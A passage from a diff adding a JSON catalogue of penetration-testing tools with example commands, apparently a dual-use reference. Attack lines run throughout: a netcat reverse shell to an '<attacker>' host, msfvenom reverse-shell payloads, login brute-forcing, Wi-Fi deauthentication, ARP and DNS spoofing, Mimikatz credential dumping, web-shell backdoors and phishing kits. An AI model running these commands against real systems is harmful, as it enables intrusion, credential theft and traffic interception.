+            "API testing"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Feroxbuster",
+          "category": "Web Application Analysis",
+          "description": "Fast recursive content discovery tool",
+          "installation": "sudo apt install feroxbuster",
+          "syntax": "feroxbuster -u <URL>",
+          "commands": [
+            {
+              "cmd": "feroxbuster -u http://site.com",
+              "explanation": "Recursive directory scan"
+            },
+            {
+              "cmd": "feroxbuster -u http://site.com -x php,html",
+              "explanation": "Filter by extension"
+            },
+            {
+              "cmd": "feroxbuster -u http://site.com -w wordlist.txt --depth 3",
+              "explanation": "Custom depth and wordlist"
+            }
+          ],
+          "use_cases": [
+            "Content discovery",
+            "Recursive enumeration",
+            "Web pentesting"
+          ],
+          "risk_level": "Low"
+        }
+      ]
+    },
+    {
+      "name": "Password Attacks",
+      "tools": [
+        {
+          "name": "Hydra",
+          "category": "Password Attacks",
+          "description": "Network logon brute-force tool",
+          "installation": "sudo apt install hydra",
+          "syntax": "hydra -l <user> -P <wordlist> <target> <service>",
+          "commands": [
+            {
+              "cmd": "hydra -l admin -P passwords.txt <target> ssh",
+              "explanation": "Brute force SSH"
+            },
+            {
+              "cmd": "hydra -L users.txt -P passwords.txt <target> http-post-form '/login:user=^USER^&pass=^PASS^:F=failed'",
+              "explanation": "HTTP form brute force"
+            },
+            {
+              "cmd": "hydra -l admin -P passwords.txt <target> ftp",
+              "explanation": "Brute force FTP"
+            }
+          ],
+          "use_cases": [
+            "Online password cracking",
+            "Service brute forcing",
+            "Credential testing"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "John the Ripper",
+          "category": "Password Attacks",
+          "description": "Password hash cracker",
+          "installation": "sudo apt install john",
+          "syntax": "john [options] <hashfile>",
+          "commands": [
+            {
+              "cmd": "john hashes.txt",
+              "explanation": "Crack with default rules"
+            },
+            {
+              "cmd": "john --wordlist=rockyou.txt hashes.txt",
+              "explanation": "Dictionary attack"
+            },
+            {
+              "cmd": "john --show hashes.txt",
+              "explanation": "Show cracked passwords"
+            }
+          ],
+          "use_cases": [
+            "Hash cracking",
+            "Password auditing",
+            "Forensic analysis"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "Hashcat",
+          "category": "Password Attacks",
+          "description": "Advanced GPU-based hash cracker",
+          "installation": "sudo apt install hashcat",
+          "syntax": "hashcat -m <mode> -a <attack> <hashfile> [wordlist]",
+          "commands": [
+            {
+              "cmd": "hashcat -m 0 -a 0 hash.txt rockyou.txt",
+              "explanation": "MD5 dictionary attack"
+            },
+            {
+              "cmd": "hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a",
+              "explanation": "NTLM brute force"
+            },
+            {
+              "cmd": "hashcat -m 0 hash.txt -a 0 wordlist.txt -r rules/best64.rule",
+              "explanation": "Rule-based attack"
+            }
+          ],
+          "use_cases": [
+            "GPU hash cracking",
+            "Password recovery",
+            "Security auditing"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "CeWL",
+          "category": "Password Attacks",
+          "description": "Custom wordlist generator from websites",
+          "installation": "sudo apt install cewl",
+          "syntax": "cewl <URL>",
+          "commands": [
+            {
+              "cmd": "cewl http://site.com -w wordlist.txt",
+              "explanation": "Generate wordlist from site"
+            },
+            {
+              "cmd": "cewl http://site.com -d 2 -m 6",
+              "explanation": "Depth 2, min 6 char words"
+            },
+            {
+              "cmd": "cewl http://site.com --with-numbers",
+              "explanation": "Include words with numbers"
+            }
+          ],
+          "use_cases": [
+            "Custom wordlist creation",
+            "Targeted password attacks",
+            "Content scraping"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Crunch",
+          "category": "Password Attacks",
+          "description": "Wordlist generator",
+          "installation": "sudo apt install crunch",
+          "syntax": "crunch <min> <max> [charset] -o <output>",
+          "commands": [
+            {
+              "cmd": "crunch 8 8 -o wordlist.txt",
+              "explanation": "Generate 8-char combinations"
+            },
+            {
+              "cmd": "crunch 4 6 abcdef123 -o wordlist.txt",
+              "explanation": "Custom charset"
+            },
+            {
+              "cmd": "crunch 6 6 -t @@%%^^ -o wordlist.txt",
+              "explanation": "Pattern-based generation"
+            }
+          ],
+          "use_cases": [
+            "Wordlist generation",
+            "Brute force preparation",
+            "Custom charset attacks"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Medusa",
+          "category": "Password Attacks",
+          "description": "Parallel network login brute-forcer",
+          "installation": "sudo apt install medusa",
+          "syntax": "medusa -h <target> -u <user> -P <wordlist> -M <module>",
+          "commands": [
+            {
+              "cmd": "medusa -h <target> -u admin -P pass.txt -M ssh",
+              "explanation": "SSH brute force"
+            },
+            {
+              "cmd": "medusa -h <target> -U users.txt -P pass.txt -M ftp",
+              "explanation": "FTP brute force"
+            },
+            {
+              "cmd": "medusa -h <target> -u admin -P pass.txt -M http -m DIR:/admin",
+              "explanation": "HTTP brute force"
+            }
+          ],
+          "use_cases": [
+            "Parallel login brute forcing",
+            "Multi-protocol attacks",
+            "Credential testing"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "Ncrack",
+          "category": "Password Attacks",
+          "description": "Network authentication cracking tool",
+          "installation": "sudo apt install ncrack",
+          "syntax": "ncrack <target>:<service>",
+          "commands": [
+            {
+              "cmd": "ncrack -vv -U users.txt -P pass.txt <target>:ssh",
+              "explanation": "SSH brute force"
+            },
+            {
+              "cmd": "ncrack <target>:rdp -u admin -P pass.txt",
+              "explanation": "RDP brute force"
+            },
+            {
+              "cmd": "ncrack <target>:ftp,ssh -U users.txt -P pass.txt",
+              "explanation": "Multi-service attack"
+            }
+          ],
+          "use_cases": [
+            "Network service cracking",
+            "RDP brute forcing",
+            "Credential testing"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "CUPP",
+          "category": "Password Attacks",
+          "description": "Common User Passwords Profiler",
+          "installation": "git clone https://github.com/Mebus/cupp.git",
+          "syntax": "python3 cupp.py [options]",
+          "commands": [
+            {
+              "cmd": "python3 cupp.py -i",
+              "explanation": "Interactive profiling mode"
+            },
+            {
+              "cmd": "python3 cupp.py -l",
+              "explanation": "Download default wordlists"
+            },
+            {
+              "cmd": "python3 cupp.py -w wordlist.txt",
+              "explanation": "Improve existing wordlist"
+            }
+          ],
+          "use_cases": [
+            "Targeted password profiling",
+            "Social engineering wordlists",
+            "Custom password generation"
+          ],
+          "risk_level": "Low"
+        }
+      ]
+    },
+    {
+      "name": "Wireless Attacks",
+      "tools": [
+        {
+          "name": "Aircrack-ng",
+          "category": "Wireless Attacks",
+          "description": "Wireless network security assessment suite",
+          "installation": "sudo apt install aircrack-ng",
+          "syntax": "aircrack-ng [options] <capture>",
+          "commands": [
+            {
+              "cmd": "airmon-ng start wlan0",
+              "explanation": "Enable monitor mode"
+            },
+            {
+              "cmd": "airodump-ng wlan0mon",
+              "explanation": "Capture wireless traffic"
+            },
+            {
+              "cmd": "aircrack-ng -w rockyou.txt capture.cap",
+              "explanation": "Crack WPA handshake"
+            },
+            {
+              "cmd": "aireplay-ng -0 5 -a <BSSID> wlan0mon",
+              "explanation": "Deauthentication attack"
+            }
+          ],
+          "use_cases": [
+            "WPA/WPA2 cracking",
+            "Wireless monitoring",
+            "Network security testing"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "Reaver",
+          "category": "Wireless Attacks",
+          "description": "WPS brute-force attack tool",
+          "installation": "sudo apt install reaver",
+          "syntax": "reaver -i <interface> -b <BSSID>",
+          "commands": [
+            {
+              "cmd": "reaver -i wlan0mon -b <BSSID> -vv",
+              "explanation": "Brute force WPS PIN"
+            },
+            {
+              "cmd": "reaver -i wlan0mon -b <BSSID> -K",
+              "explanation": "Pixie dust attack"
+            },
+            {
+              "cmd": "reaver -i wlan0mon -b <BSSID> -d 0",
+              "explanation": "No delay between attempts"
+            }
+          ],
+          "use_cases": [
+            "WPS cracking",
+            "Router exploitation",
+            "Wireless pentesting"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "Wifite",
+          "category": "Wireless Attacks",
+          "description": "Automated wireless attack tool",
+          "installation": "sudo apt install wifite",
+          "syntax": "wifite [options]",
+          "commands": [
+            {
+              "cmd": "wifite",
+              "explanation": "Auto scan and attack"
+            },
+            {
+              "cmd": "wifite --kill",
+              "explanation": "Kill conflicting processes and attack"
+            },
+            {
+              "cmd": "wifite -e <ESSID>",
+              "explanation": "Target specific network"
+            }
+          ],
+          "use_cases": [
+            "Automated wifi cracking",
+            "Wireless auditing",
+            "Quick wireless assessments"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "Fern Wifi Cracker",
+          "category": "Wireless Attacks",
+          "description": "GUI wireless security auditor",
+          "installation": "sudo apt install fern-wifi-cracker",
+          "syntax": "fern-wifi-cracker (GUI)",
+          "commands": [
+            {
+              "cmd": "fern-wifi-cracker",
+              "explanation": "Launch GUI"
+            },
+            {
+              "cmd": "Select interface and scan",
+              "explanation": "Discover networks"
+            },
+            {
+              "cmd": "Select target and attack",
+              "explanation": "Execute cracking"
+            }
+          ],
+          "use_cases": [
+            "GUI-based wifi cracking",
+            "WEP/WPA attacks",
+            "Wireless auditing"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "Kismet",
+          "category": "Wireless Attacks",
+          "description": "Wireless network detector and sniffer",
+          "installation": "sudo apt install kismet",
+          "syntax": "kismet",
+          "commands": [
+            {
+              "cmd": "kismet",
+              "explanation": "Start Kismet server and UI"
+            },
+            {
+              "cmd": "kismet -c wlan0",
+              "explanation": "Specify capture interface"
+            },
+            {
+              "cmd": "kismet --no-logging",
+              "explanation": "Run without logging"
+            }
+          ],
+          "use_cases": [
+            "Wireless network detection",
+            "Packet sniffing",
+            "Rogue AP detection"
+          ],
+          "risk_level": "Medium"
+        }
+      ]
+    },
+    {
+      "name": "Sniffing & Spoofing",
+      "tools": [
+        {
+          "name": "Wireshark",
+          "category": "Sniffing & Spoofing",
+          "description": "Network protocol analyzer",
+          "installation": "sudo apt install wireshark",
+          "syntax": "wireshark (GUI) / tshark (CLI)",
+          "commands": [
+            {
+              "cmd": "wireshark",
+              "explanation": "Launch GUI analyzer"
+            },
+            {
+              "cmd": "tshark -i eth0",
+              "explanation": "Capture on interface"
+            },
+            {
+              "cmd": "tshark -r capture.pcap -Y 'http'",
+              "explanation": "Filter HTTP traffic"
+            },
+            {
+              "cmd": "tshark -i eth0 -w output.pcap",
+              "explanation": "Save capture to file"
+            }
+          ],
+          "use_cases": [
+            "Packet analysis",
+            "Network troubleshooting",
+            "Traffic inspection"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Ettercap",
+          "category": "Sniffing & Spoofing",
+          "description": "MITM attack suite",
+          "installation": "sudo apt install ettercap-graphical",
+          "syntax": "ettercap [options]",
+          "commands": [
+            {
+              "cmd": "ettercap -G",
+              "explanation": "Launch GUI mode"
+            },
+            {
+              "cmd": "ettercap -T -M arp:remote /<target1>// /<target2>//",
+              "explanation": "ARP spoofing MITM"
+            },
+            {
+              "cmd": "ettercap -T -i eth0 -P dns_spoof",
+              "explanation": "DNS spoofing attack"
+            }
+          ],
+          "use_cases": [
+            "ARP spoofing",
+            "MITM attacks",
+            "Network sniffing"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "Netcat",
+          "category": "Sniffing & Spoofing",
+          "description": "Network utility for reading/writing connections",
+          "installation": "sudo apt install netcat-openbsd",
+          "syntax": "nc [options] <host> <port>",
+          "commands": [
+            {
+              "cmd": "nc -lvnp 4444",
+              "explanation": "Start a listener"
+            },
+            {
+              "cmd": "nc <target> 80",
+              "explanation": "Connect to port 80"
+            },
+            {
+              "cmd": "nc -e /bin/bash <attacker> 4444",
+              "explanation": "Reverse shell"
+            }
+          ],
+          "use_cases": [
+            "Reverse shells",
+            "Port scanning",
+            "File transfer"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "Responder",
+          "category": "Sniffing & Spoofing",
+          "description": "LLMNR/NBT-NS/MDNS poisoner",
+          "installation": "sudo apt install responder",
+          "syntax": "responder -I <interface>",
+          "commands": [
+            {
+              "cmd": "responder -I eth0",
+              "explanation": "Start poisoning on interface"
+            },
+            {
+              "cmd": "responder -I eth0 -wrf",
+              "explanation": "Enable WPAD rogue proxy and fingerprinting"
+            },
+            {
+              "cmd": "responder -I eth0 --lm",
+              "explanation": "Force LM hash downgrade"
+            }
+          ],
+          "use_cases": [
+            "Credential harvesting",
+            "LLMNR poisoning",
+            "NTLM relay attacks"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "Bettercap",
+          "category": "Sniffing & Spoofing",
+          "description": "Network attack and monitoring framework",
+          "installation": "sudo apt install bettercap",
+          "syntax": "bettercap -iface <interface>",
+          "commands": [
+            {
+              "cmd": "bettercap -iface eth0",
+              "explanation": "Start interactive session"
+            },
+            {
+              "cmd": "net.probe on",
+              "explanation": "Discover network hosts"
+            },
+            {
+              "cmd": "arp.spoof on",
+              "explanation": "Start ARP spoofing"
+            }
+          ],
+          "use_cases": [
+            "MITM attacks",
+            "Network recon",
+            "Traffic manipulation"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "arpspoof",
+          "category": "Sniffing & Spoofing",
+          "description": "ARP spoofing utility",
+          "installation": "sudo apt install dsniff",
+          "syntax": "arpspoof -i <interface> -t <target> <gateway>",
+          "commands": [
+            {
+              "cmd": "arpspoof -i eth0 -t 192.168.1.5 192.168.1.1",
+              "explanation": "Spoof target's ARP cache"
+            },
+            {
+              "cmd": "arpspoof -i eth0 -t 192.168.1.1 192.168.1.5",
+              "explanation": "Spoof gateway's ARP cache"
+            },
+            {
+              "cmd": "echo 1 > /proc/sys/net/ipv4/ip_forward",
+              "explanation": "Enable IP forwarding"
+            }
+          ],
+          "use_cases": [
+            "ARP cache poisoning",
+            "MITM attacks",
+            "Traffic interception"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "tcpdump",
+          "category": "Sniffing & Spoofing",
+          "description": "Command-line packet analyzer",
+          "installation": "sudo apt install tcpdump",
+          "syntax": "tcpdump [options]",
+          "commands": [
+            {
+              "cmd": "tcpdump -i eth0",
+              "explanation": "Capture all traffic on interface"
+            },
+            {
+              "cmd": "tcpdump -i eth0 port 80 -w http.pcap",
+              "explanation": "Capture HTTP to file"
+            },
+            {
+              "cmd": "tcpdump -r capture.pcap",
+              "explanation": "Read saved capture"
+            }
+          ],
+          "use_cases": [
+            "Packet capture",
+            "Traffic analysis",
+            "Network debugging"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "mitmproxy",
+          "category": "Sniffing & Spoofing",
+          "description": "Interactive HTTPS proxy",
+          "installation": "pip install mitmproxy",
+          "syntax": "mitmproxy",
+          "commands": [
+            {
+              "cmd": "mitmproxy",
+              "explanation": "Launch interactive proxy"
+            },
+            {
+              "cmd": "mitmdump -w traffic.flow",
+              "explanation": "Dump traffic to file"
+            },
+            {
+              "cmd": "mitmweb",
+              "explanation": "Launch web-based interface"
+            }
+          ],
+          "use_cases": [
+            "HTTPS interception",
+            "API testing",
+            "Traffic modification"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "macchanger",
+          "category": "Sniffing & Spoofing",
+          "description": "MAC address manipulation tool",
+          "installation": "sudo apt install macchanger",
+          "syntax": "macchanger [options] <interface>",
+          "commands": [
+            {
+              "cmd": "macchanger -r eth0",
+              "explanation": "Assign random MAC"
+            },
+            {
+              "cmd": "macchanger -m 00:11:22:33:44:55 eth0",
+              "explanation": "Set specific MAC"
+            },
+            {
+              "cmd": "macchanger -s eth0",
+              "explanation": "Show current MAC"
+            }
+          ],
+          "use_cases": [
+            "MAC address spoofing",
+            "Identity masking",
+            "Network access bypass"
+          ],
+          "risk_level": "Low"
+        }
+      ]
+    },
+    {
+      "name": "Exploitation Tools",
+      "tools": [
+        {
+          "name": "Metasploit Framework",
+          "category": "Exploitation Tools",
+          "description": "Penetration testing and exploitation framework",
+          "installation": "sudo apt install metasploit-framework",
+          "syntax": "msfconsole",
+          "commands": [
+            {
+              "cmd": "msfconsole",
+              "explanation": "Launch Metasploit console"
+            },
+            {
+              "cmd": "use exploit/multi/handler",
+              "explanation": "Load exploit handler"
+            },
+            {
+              "cmd": "set PAYLOAD windows/meterpreter/reverse_tcp",
+              "explanation": "Set payload"
+            },
+            {
+              "cmd": "search type:exploit platform:windows",
+              "explanation": "Search exploits"
+            },
+            {
+              "cmd": "exploit",
+              "explanation": "Execute the exploit"
+            }
+          ],
+          "use_cases": [
+            "Exploitation",
+            "Payload generation",
+            "Post-exploitation"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "BeEF",
+          "category": "Exploitation Tools",
+          "description": "Browser Exploitation Framework",
+          "installation": "sudo apt install beef-xss",
+          "syntax": "beef-xss",
+          "commands": [
+            {
+              "cmd": "beef-xss",
+              "explanation": "Start BeEF server"
+            },
+            {
+              "cmd": "Open http://127.0.0.1:3000/ui/panel",
+              "explanation": "Access web panel"
+            },
+            {
+              "cmd": "Hook browser via <script src='hook.js'>",
+              "explanation": "Hook target browser"
+            }
+          ],
+          "use_cases": [
+            "Browser exploitation",
+            "XSS exploitation",
+            "Client-side attacks"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "Social Engineering Toolkit",
+          "category": "Exploitation Tools",
+          "description": "Social engineering attack platform",
+          "installation": "sudo apt install set",
+          "syntax": "setoolkit",
+          "commands": [
+            {
+              "cmd": "setoolkit",
+              "explanation": "Launch SET menu"
+            },
+            {
+              "cmd": "1) Social-Engineering Attacks",
+              "explanation": "Main attack menu"
+            },
+            {
+              "cmd": "2) Website Attack Vectors",
+              "explanation": "Clone and phish websites"
+            }
+          ],
+          "use_cases": [
+            "Phishing campaigns",
+            "Credential harvesting",
+            "Social engineering"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "SearchSploit",
+          "category": "Exploitation Tools",
+          "description": "Offline ExploitDB search tool",
+          "installation": "sudo apt install exploitdb",
+          "syntax": "searchsploit <query>",
+          "commands": [
+            {
+              "cmd": "searchsploit apache 2.4",
+              "explanation": "Search for Apache exploits"
+            },
+            {
+              "cmd": "searchsploit -m 12345",
+              "explanation": "Mirror exploit to current dir"
+            },
+            {
+              "cmd": "searchsploit --cve CVE-2021-44228",
+              "explanation": "Search by CVE"
+            }
+          ],
+          "use_cases": [
+            "Exploit research",
+            "Vulnerability mapping",
+            "Offline exploit database"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "MSFVenom",
+          "category": "Exploitation Tools",
+          "description": "Payload generator for Metasploit",
+          "installation": "sudo apt install metasploit-framework",
+          "syntax": "msfvenom [options]",
+          "commands": [
+            {
+              "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe",
+              "explanation": "Windows reverse shell EXE"
+            },
+            {
+              "cmd": "msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf",
+              "explanation": "Linux reverse shell"
+            },
+            {
+              "cmd": "msfvenom -l payloads",
+              "explanation": "List available payloads"
+            }
+          ],
+          "use_cases": [
+            "Payload generation",
+            "Shellcode creation",
+            "AV evasion testing"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "Cobalt Strike",
+          "category": "Exploitation Tools",
+          "description": "Commercial adversary simulation platform",
+          "installation": "Licensed commercial software",
+          "syntax": "./cobaltstrike",
+          "commands": [
+            {
+              "cmd": "./teamserver <IP> <password>",
+              "explanation": "Start team server"
+            },
+            {
+              "cmd": "./cobaltstrike",
+              "explanation": "Launch client GUI"
+            },
+            {
+              "cmd": "Attacks > Packages > Windows EXE",
+              "explanation": "Generate payload"
+            }
+          ],
+          "use_cases": [
+            "Red team operations",
+            "Adversary simulation",
+            "C2 framework"
+          ],
+          "risk_level": "High"
+        }
+      ]
+    },
+    {
+      "name": "Post Exploitation",
+      "tools": [
+        {
+          "name": "CrackMapExec",
+          "category": "Post Exploitation",
+          "description": "Network pentesting swiss army knife",
+          "installation": "sudo apt install crackmapexec",
+          "syntax": "crackmapexec <protocol> <target> [options]",
+          "commands": [
+            {
+              "cmd": "crackmapexec smb 192.168.1.0/24",
+              "explanation": "Enumerate SMB hosts"
+            },
+            {
+              "cmd": "crackmapexec smb <target> -u user -p pass --shares",
+              "explanation": "List shares with creds"
+            },
+            {
+              "cmd": "crackmapexec smb <target> -u user -p pass -x 'whoami'",
+              "explanation": "Execute command"
+            }
+          ],
+          "use_cases": [
+            "Lateral movement",
+            "Credential validation",
+            "Network enumeration"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "Bloodhound",
+          "category": "Post Exploitation",
+          "description": "Active Directory relationship mapper",
+          "installation": "sudo apt install bloodhound",
+          "syntax": "bloodhound",
+          "commands": [
+            {
+              "cmd": "neo4j console",
+              "explanation": "Start database"
+            },
+            {
+              "cmd": "bloodhound",
+              "explanation": "Launch GUI"
+            },
+            {
+              "cmd": "SharpHound.exe -c All",
+              "explanation": "Collect AD data"
+            }
+          ],
+          "use_cases": [
+            "AD attack path mapping",
+            "Privilege escalation planning",
+            "Domain enumeration"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "Mimikatz",
+          "category": "Post Exploitation",
+          "description": "Windows credential extraction tool",
+          "installation": "Download from GitHub releases",
+          "syntax": "mimikatz.exe",
+          "commands": [
+            {
+              "cmd": "privilege::debug",
+              "explanation": "Enable debug privilege"
+            },
+            {
+              "cmd": "sekurlsa::logonpasswords",
+              "explanation": "Dump plaintext passwords"
+            },
+            {
+              "cmd": "lsadump::sam",
+              "explanation": "Dump SAM database"
+            }
+          ],
+          "use_cases": [
+            "Credential dumping",
+            "Pass-the-hash",
+            "Kerberos attacks"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "Evil-WinRM",
+          "category": "Post Exploitation",
+          "description": "Windows Remote Management shell",
+          "installation": "gem install evil-winrm",
+          "syntax": "evil-winrm -i <target> -u <user> -p <pass>",
+          "commands": [
+            {
+              "cmd": "evil-winrm -i <target> -u admin -p password",
+              "explanation": "Connect to target"
+            },
+            {
+              "cmd": "upload /local/file.exe C:\\remote\\file.exe",
+              "explanation": "Upload file"
+            },
+            {
+              "cmd": "download C:\\remote\\file.txt /local/",
+              "explanation": "Download file"
+            }
+          ],
+          "use_cases": [
+            "Windows remote access",
+            "File transfer",
+            "Post-exploitation"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "Impacket",
+          "category": "Post Exploitation",
+          "description": "Python network protocol toolkit",
+          "installation": "pip install impacket",
+          "syntax": "impacket scripts in /usr/share/doc/python3-impacket/",
+          "commands": [
+            {
+              "cmd": "psexec.py domain/user:password@<target>",
+              "explanation": "Remote shell via PsExec"
+            },
+            {
+              "cmd": "secretsdump.py domain/user:password@<target>",
+              "explanation": "Dump credentials"
+            },
+            {
+              "cmd": "smbserver.py share /tmp",
+              "explanation": "Start SMB server"
+            }
+          ],
+          "use_cases": [
+            "Lateral movement",
+            "Credential dumping",
+            "Remote execution"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "Weevely",
+          "category": "Post Exploitation",
+          "description": "Stealth PHP web shell",
+          "installation": "sudo apt install weevely",
+          "syntax": "weevely generate <password> <path>",
+          "commands": [
+            {
+              "cmd": "weevely generate mypass agent.php",
+              "explanation": "Generate backdoor"
+            },
+            {
+              "cmd": "weevely http://site.com/agent.php mypass",
+              "explanation": "Connect to shell"
+            },
+            {
+              "cmd": "file_upload /local/file /remote/path",
+              "explanation": "Upload via shell"
+            }
+          ],
+          "use_cases": [
+            "Web shell access",
+            "PHP backdoors",
+            "Post-exploitation"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "Empire",
+          "category": "Post Exploitation",
+          "description": "Post-exploitation PowerShell framework",
+          "installation": "sudo apt install powershell-empire",
+          "syntax": "powershell-empire",
+          "commands": [
+            {
+              "cmd": "powershell-empire server",
+              "explanation": "Start server"
+            },
+            {
+              "cmd": "powershell-empire client",
+              "explanation": "Start client"
+            },
+            {
+              "cmd": "uselistener http",
+              "explanation": "Create HTTP listener"
+            }
+          ],
+          "use_cases": [
+            "PowerShell post-exploitation",
+            "Lateral movement",
+            "Persistence"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "LinPEAS",
+          "category": "Post Exploitation",
+          "description": "Linux privilege escalation auditing script",
+          "installation": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh",
+          "syntax": "./linpeas.sh",
+          "commands": [
+            {
+              "cmd": "./linpeas.sh",
+              "explanation": "Run full audit"
+            },
+            {
+              "cmd": "./linpeas.sh -s",
+              "explanation": "Superfast mode"
+            },
+            {
+              "cmd": "./linpeas.sh -a",
+              "explanation": "Run all checks"
+            }
+          ],
+          "use_cases": [
+            "Linux privilege escalation",
+            "Misconfiguration detection",
+            "Post-exploitation recon"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "WinPEAS",
+          "category": "Post Exploitation",
+          "description": "Windows privilege escalation auditing script",
+          "installation": "Download from PEASS-ng GitHub releases",
+          "syntax": "winpeas.exe",
+          "commands": [
+            {
+              "cmd": "winpeas.exe",
+              "explanation": "Run full audit"
+            },
+            {
+              "cmd": "winpeas.exe fast",
+              "explanation": "Quick scan"
+            },
+            {
+              "cmd": "winpeas.exe servicesinfo",
+              "explanation": "Check services only"
+            }
+          ],
+          "use_cases": [
+            "Windows privilege escalation",
+            "Misconfiguration detection",
+            "Post-exploitation recon"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "Chisel",
+          "category": "Post Exploitation",
+          "description": "TCP/UDP tunneling over HTTP",
+          "installation": "go install github.com/jpillora/chisel@latest",
+          "syntax": "chisel <mode> [options]",
+          "commands": [
+            {
+              "cmd": "chisel server --reverse --port 8080",
+              "explanation": "Start server with reverse mode"
+            },
+            {
+              "cmd": "chisel client <server>:8080 R:8888:127.0.0.1:80",
+              "explanation": "Reverse port forward"
+            },
+            {
+              "cmd": "chisel client <server>:8080 socks",
+              "explanation": "Create SOCKS proxy"
+            }
+          ],
+          "use_cases": [
+            "Port forwarding",
+            "Tunneling through firewalls",
+            "Pivoting"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "ProxyChains",
+          "category": "Post Exploitation",
+          "description": "TCP connection proxy routing tool",
+          "installation": "sudo apt install proxychains4",
+          "syntax": "proxychains4 <command>",
+          "commands": [
+            {
+              "cmd": "proxychains4 nmap -sT <target>",
+              "explanation": "Scan through proxy"
+            },
+            {
+              "cmd": "proxychains4 curl http://target.com",
+              "explanation": "HTTP via proxy chain"
+            },
+            {
+              "cmd": "Edit /etc/proxychains4.conf",
+              "explanation": "Configure proxy list"
+            }
+          ],
+          "use_cases": [
+            "Traffic anonymization",
+            "Pivoting",
+            "Proxy routing"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "sshuttle",
+          "category": "Post Exploitation",
+          "description": "Transparent proxy VPN over SSH",
+          "installation": "sudo apt install sshuttle",
+          "syntax": "sshuttle -r <user>@<target> <subnet>",
+          "commands": [
+            {
+              "cmd": "sshuttle -r user@pivot 10.10.10.0/24",
+              "explanation": "Tunnel subnet via SSH"
+            },
+            {
+              "cmd": "sshuttle -r user@pivot 0/0",
+              "explanation": "Route all traffic"
+            },
+            {
+              "cmd": "sshuttle -r user@pivot 10.0.0.0/8 --dns",
+              "explanation": "Include DNS tunneling"
+            }
+          ],
+          "use_cases": [
+            "VPN over SSH",
+            "Network pivoting",
+            "Subnet routing"
+          ],
+          "risk_level": "Medium"
+        }
+      ]
+    },
+    {
+      "name": "Forensics",
+      "tools": [
+        {
+          "name": "Autopsy",
+          "category": "Forensics",
+          "description": "Digital forensics platform",
+          "installation": "sudo apt install autopsy",
+          "syntax": "autopsy (GUI)",
+          "commands": [
+            {
+              "cmd": "autopsy",
+              "explanation": "Launch web-based GUI"
+            },
+            {
+              "cmd": "Open case > Add data source",
+              "explanation": "Load disk image"
+            },
+            {
+              "cmd": "Run ingest modules",
+              "explanation": "Analyze artifacts"
+            }
+          ],
+          "use_cases": [
+            "Disk forensics",
+            "Evidence analysis",
+            "File recovery"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Volatility",
+          "category": "Forensics",
+          "description": "Memory forensics framework",
+          "installation": "pip install volatility3",
+          "syntax": "vol.py [options]",
+          "commands": [
+            {
+              "cmd": "vol.py -f memory.dmp windows.info",
+              "explanation": "Get system info"
+            },
+            {
+              "cmd": "vol.py -f memory.dmp windows.pslist",
+              "explanation": "List processes"
+            },
+            {
+              "cmd": "vol.py -f memory.dmp windows.hashdump",
+              "explanation": "Extract password hashes"
+            }
+          ],
+          "use_cases": [
+            "Memory analysis",
+            "Malware detection",
+            "Incident response"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Binwalk",
+          "category": "Forensics",
+          "description": "Firmware analysis and extraction tool",
+          "installation": "sudo apt install binwalk",
+          "syntax": "binwalk [options] <firmware>",
+          "commands": [
+            {
+              "cmd": "binwalk firmware.bin",
+              "explanation": "Scan for embedded files"
+            },
+            {
+              "cmd": "binwalk -e firmware.bin",
+              "explanation": "Extract embedded files"
+            },
+            {
+              "cmd": "binwalk --entropy firmware.bin",
+              "explanation": "Entropy analysis"
+            }
+          ],
+          "use_cases": [
+            "Firmware analysis",
+            "Embedded file extraction",
+            "Reverse engineering"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Steghide",
+          "category": "Forensics",
+          "description": "Steganography embedding/extraction tool",
+          "installation": "sudo apt install steghide",
+          "syntax": "steghide <command> [options]",
+          "commands": [
+            {
+              "cmd": "steghide embed -cf image.jpg -ef secret.txt",
+              "explanation": "Hide file in image"
+            },
+            {
+              "cmd": "steghide extract -sf image.jpg",
+              "explanation": "Extract hidden data"
+            },
+            {
